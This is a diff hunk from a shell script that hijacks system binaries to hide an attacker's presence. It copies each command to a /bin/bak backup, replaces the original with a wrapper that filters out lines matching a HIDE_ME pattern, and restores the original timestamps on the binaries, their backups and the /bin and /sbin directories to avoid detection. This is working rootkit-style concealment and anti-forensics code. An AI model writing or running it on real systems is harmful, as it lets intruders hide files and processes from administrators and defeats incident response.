@@ -184,27 +184,28 @@ else
 					cecho log "Binary '$command' has already been hijacked, skipping"
 				else
 					command_timestamp=$(get_timestamp "$command_path")
+
 					if ! cp "$command_path" "/bin/bak${command}"; then
 						cecho error "Could not copy '$command_path' to '/bin/bak${command}', aborting"
 					else
 						if ! echo "/bin/bak${command} \$@ | egrep -v \"$HIDE_ME\"" > "$command_path"; then
 							cecho error "Could not write to '$command_path', restoring original binary..."
 							mv "/bin/bak${command}" "$command_path" || cecho error "Could not restore original binary '$command_path'"
-							touch -t $command_timestamp "$command_path"
 						else
 							cecho info "Replaced binary at '$command_path'"
 							chmod 755 "$command_path" || cecho error "Could not chmod '$command_path'"
-							touch -t $command_timestamp "$command_path"
 						fi
 					fi
+
+					set_timestamp $command_timestamp "$command_path"
+					set_timestamp $command_timestamp "/bin/bak${command}"
 				fi
 			fi
 		fi
 	done
 
-	touch -t $bin_timestamp "/bin"
-	touch -t $sbin_timestamp "/sbin"
-	cecho info "Restored '/bin' and '/sbin' timestamps"
+	set_timestamp $bin_timestamp "/bin"
+	set_timestamp $sbin_timestamp "/sbin"
 fi
 
 cecho done "Done replacing binaries!"
